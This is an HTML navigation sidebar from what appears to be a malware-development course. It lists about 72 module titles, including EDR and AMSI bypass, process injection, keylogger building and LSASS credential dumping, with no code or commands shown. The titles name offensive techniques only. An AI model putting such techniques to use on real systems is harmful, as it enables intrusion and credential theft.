                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
